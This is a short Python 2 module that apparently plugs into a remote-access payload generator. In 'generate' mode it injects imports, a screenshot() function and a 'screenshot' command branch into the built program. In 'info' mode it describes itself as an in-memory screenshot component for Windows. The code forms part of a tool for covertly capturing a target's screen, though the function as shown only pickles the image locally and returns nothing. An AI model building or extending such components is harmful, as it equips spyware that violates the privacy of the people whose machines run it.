import library.modules.config as config

config.main()


def main(option):
    if option == 'generate':
        config.import_statements.append('import pyscreenshot as ImageGrab')
        config.import_statements.append('import pickle')
        config.functions.append('''
def screenshot():
    im = ImageGrab.grab()
    bytes = pickle.dumps(im)
''')
        config.logics.append('''
elif command == "screenshot":
            screenshot()''')

    elif option == 'info':
        print '\nName             : In-memory Screenshot component' \
              '\nOS               : Windows' \
              '\nRequired Modules : pyscreenshot, pickle' \
              '\nCommands         : screenshot' \
              '\nDescription      : This module takes a screenshot and stores it in-memory'
